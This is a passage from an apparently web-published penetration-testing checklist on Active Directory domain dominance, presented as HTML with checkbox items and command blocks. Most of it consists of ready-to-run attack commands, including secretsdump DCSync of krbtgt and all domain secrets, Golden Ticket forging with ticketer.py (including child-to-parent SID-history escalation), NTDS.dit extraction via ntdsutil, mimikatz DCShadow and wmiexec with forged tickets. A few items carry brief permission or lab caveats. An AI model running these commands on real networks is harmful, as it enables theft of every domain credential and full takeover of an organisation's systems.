+<div class="language-bash highlight"><pre><span></span><code><span id="__span-81-1"><a id="__codelineno-81-1" name="__codelineno-81-1" href="#__codelineno-81-1"></a>secretsdump.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span>@<span class="nv">$DC_IP</span><span class="w"> </span>-just-dc-user<span class="w"> </span>krbtgt
+</span></code></pre></div>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> <strong>Dump <code>krbtgt</code> only when explicitly allowed</strong></li>
+</ul>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-82-1"><a id="__codelineno-82-1" name="__codelineno-82-1" href="#__codelineno-82-1"></a>secretsdump.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span>@<span class="nv">$DC_IP</span><span class="w"> </span>-just-dc-user<span class="w"> </span>krbtgt
+</span></code></pre></div>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> <strong>Dump domain secrets only when explicitly allowed</strong></li>
+</ul>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-83-1"><a id="__codelineno-83-1" name="__codelineno-83-1" href="#__codelineno-83-1"></a>secretsdump.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span>@<span class="nv">$DC_IP</span><span class="w"> </span>-just-dc
+</span></code></pre></div>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> <strong>Create and validate Golden Ticket in lab if <code>krbtgt</code> is available</strong></li>
+</ul>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-84-1"><a id="__codelineno-84-1" name="__codelineno-84-1" href="#__codelineno-84-1"></a>ticketer.py<span class="w"> </span>-nthash<span class="w"> </span>KRBTGT_NT_HASH<span class="w"> </span>-domain-sid<span class="w"> </span><span class="nv">$DOMAIN_SID</span><span class="w"> </span>-domain<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>Administrator
+</span><span id="__span-84-2"><a id="__codelineno-84-2" name="__codelineno-84-2" href="#__codelineno-84-2"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="nv">$PWD</span>/Administrator.ccache
+</span><span id="__span-84-3"><a id="__codelineno-84-3" name="__codelineno-84-3" href="#__codelineno-84-3"></a>klist
+</span></code></pre></div>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> <strong>Check trust relationships</strong></li>
+</ul>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-85-1"><a id="__codelineno-85-1" name="__codelineno-85-1" href="#__codelineno-85-1"></a><span class="nb">Get-DomainTrust</span>
+</span><span id="__span-85-2"><a id="__codelineno-85-2" name="__codelineno-85-2" href="#__codelineno-85-2"></a><span class="nb">Get-DomainTrustMapping</span>
+</span><span id="__span-85-3"><a id="__codelineno-85-3" name="__codelineno-85-3" href="#__codelineno-85-3"></a><span class="nb">Get-ForestTrust</span>
+</span></code></pre></div>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-86-1"><a id="__codelineno-86-1" name="__codelineno-86-1" href="#__codelineno-86-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>-D<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$NETBIOS</span><span class="s2">\\</span><span class="nv">$USER</span><span class="s2">&quot;</span><span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-86-2"><a id="__codelineno-86-2" name="__codelineno-86-2" href="#__codelineno-86-2"></a>-b<span class="w"> </span><span class="s2">&quot;CN=System,</span><span class="nv">$DOMAIN_DN</span><span class="s2">&quot;</span><span class="w"> </span><span class="s2">&quot;(objectClass=trustedDomain)&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-86-3"><a id="__codelineno-86-3" name="__codelineno-86-3" href="#__codelineno-86-3"></a>cn<span class="w"> </span>trustPartner<span class="w"> </span>trustDirection<span class="w"> </span>trustType<span class="w"> </span>trustAttributes
+</span></code></pre></div>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> <strong>Check child-to-parent path if operating from a child domain</strong></li>
+</ul>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-87-1"><a id="__codelineno-87-1" name="__codelineno-87-1" href="#__codelineno-87-1"></a>secretsdump.py<span class="w"> </span><span class="nv">$CHILD_DOMAIN</span>/<span class="nv">$USER</span>:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span>@<span class="nv">$DC_IP</span><span class="w"> </span>-just-dc-user<span class="w"> </span>krbtgt
+</span></code></pre></div>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-88-1"><a id="__codelineno-88-1" name="__codelineno-88-1" href="#__codelineno-88-1"></a>ticketer.py<span class="w"> </span>-nthash<span class="w"> </span>CHILD_KRBTGT_NT_HASH<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-88-2"><a id="__codelineno-88-2" name="__codelineno-88-2" href="#__codelineno-88-2"></a>-domain-sid<span class="w"> </span><span class="nv">$CHILD_SID</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-88-3"><a id="__codelineno-88-3" name="__codelineno-88-3" href="#__codelineno-88-3"></a>-domain<span class="w"> </span><span class="nv">$CHILD_DOMAIN</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-88-4"><a id="__codelineno-88-4" name="__codelineno-88-4" href="#__codelineno-88-4"></a>-extra-sid<span class="w"> </span><span class="si">${</span><span class="nv">PARENT_SID</span><span class="si">}</span>-519<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-88-5"><a id="__codelineno-88-5" name="__codelineno-88-5" href="#__codelineno-88-5"></a>Administrator
+</span></code></pre></div>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> <strong>Check SID history</strong></li>
+</ul>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-89-1"><a id="__codelineno-89-1" name="__codelineno-89-1" href="#__codelineno-89-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>-D<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$NETBIOS</span><span class="s2">\\</span><span class="nv">$USER</span><span class="s2">&quot;</span><span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-89-2"><a id="__codelineno-89-2" name="__codelineno-89-2" href="#__codelineno-89-2"></a>-b<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$DOMAIN_DN</span><span class="s2">&quot;</span><span class="w"> </span><span class="s2">&quot;(sIDHistory=*)&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-89-3"><a id="__codelineno-89-3" name="__codelineno-89-3" href="#__codelineno-89-3"></a>sAMAccountName<span class="w"> </span>objectSid<span class="w"> </span>sIDHistory
+</span></code></pre></div>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> <strong>Check NTDS dumping options</strong></li>
+</ul>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-90-1"><a id="__codelineno-90-1" name="__codelineno-90-1" href="#__codelineno-90-1"></a>secretsdump.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span>@<span class="nv">$DC_IP</span><span class="w"> </span>-use-vss
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-91-1"><a id="__codelineno-91-1" name="__codelineno-91-1" href="#__codelineno-91-1"></a>ntdsutil &quot;activate instance ntds&quot; &quot;ifm&quot; &quot;create full C:\Windows\Temp\ntds_ifm&quot; quit quit
+</span></code></pre></div>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> <strong>Check DCShadow only in controlled labs</strong></li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-92-1"><a id="__codelineno-92-1" name="__codelineno-92-1" href="#__codelineno-92-1"></a>mimikatz.exe
+</span><span id="__span-92-2"><a id="__codelineno-92-2" name="__codelineno-92-2" href="#__codelineno-92-2"></a>privilege::debug
+</span><span id="__span-92-3"><a id="__codelineno-92-3" name="__codelineno-92-3" href="#__codelineno-92-3"></a>lsadump::dcshadow /object:CN=TargetUser,CN=Users,DC=corp,DC=local /attribute:description /value:&quot;test&quot;
+</span><span id="__span-92-4"><a id="__codelineno-92-4" name="__codelineno-92-4" href="#__codelineno-92-4"></a>lsadump::dcshadow /push
+</span></code></pre></div>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> <strong>Validate ticket-based access</strong></li>
+</ul>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-93-1"><a id="__codelineno-93-1" name="__codelineno-93-1" href="#__codelineno-93-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="nv">$PWD</span>/Administrator.ccache
+</span><span id="__span-93-2"><a id="__codelineno-93-2" name="__codelineno-93-2" href="#__codelineno-93-2"></a>klist
+</span><span id="__span-93-3"><a id="__codelineno-93-3" name="__codelineno-93-3" href="#__codelineno-93-3"></a>wmiexec.py<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span><span class="nv">$DOMAIN</span>/Administrator@<span class="nv">$DC_HOST</span>
+</span></code></pre></div>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> <strong>Validate replication or DC access impact</strong></li>
+</ul>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-94-1"><a id="__codelineno-94-1" name="__codelineno-94-1" href="#__codelineno-94-1"></a>secretsdump.py<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span><span class="nv">$DOMAIN</span>/Administrator@<span class="nv">$DC_HOST</span><span class="w"> </span>-just-dc-user<span class="w"> </span>krbtgt
+</span></code></pre></div>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> <strong>Keep artifacts separated</strong></li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-95-1"><a id="__codelineno-95-1" name="__codelineno-95-1" href="#__codelineno-95-1"></a>DCSync output
+</span><span id="__span-95-2"><a id="__codelineno-95-2" name="__codelineno-95-2" href="#__codelineno-95-2"></a>krbtgt material
+</span><span id="__span-95-3"><a id="__codelineno-95-3" name="__codelineno-95-3" href="#__codelineno-95-3"></a>Golden Ticket ccache/kirbi
+</span><span id="__span-95-4"><a id="__codelineno-95-4" name="__codelineno-95-4" href="#__codelineno-95-4"></a>NTDS.dit
+</span><span id="__span-95-5"><a id="__codelineno-95-5" name="__codelineno-95-5" href="#__codelineno-95-5"></a>SYSTEM hive
+</span><span id="__span-95-6"><a id="__codelineno-95-6" name="__codelineno-95-6" href="#__codelineno-95-6"></a>Trust keys
+</span><span id="__span-95-7"><a id="__codelineno-95-7" name="__codelineno-95-7" href="#__codelineno-95-7"></a>SID data
+</span><span id="__span-95-8"><a id="__codelineno-95-8" name="__codelineno-95-8" href="#__codelineno-95-8"></a>Command output
+</span></code></pre></div>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../Priv_Escalation/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Privilege Escalation">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                Privilege Escalation
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../Persistance/" class="md-footer__link md-footer__link--next" aria-label="Next: Persistance">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                Persistance
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.sections", "toc.integrate", "toc.follow", "navigation.tracking", "content.code.copy", "content.code.annotate", "navigation.top", "navigation.footer", "search.suggest", "search.highlight"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+        <script src="../../javascripts/runaway-bat.js"></script>
+      
+        <script src="../../javascripts/sidebar-follow-active.js"></script>
+      
+        <script src="../../javascripts/page-up.js"></script>
+      
+        <script src="../../javascripts/checklist-state.js"></script>
+      
+    
+  </body>
+</html>
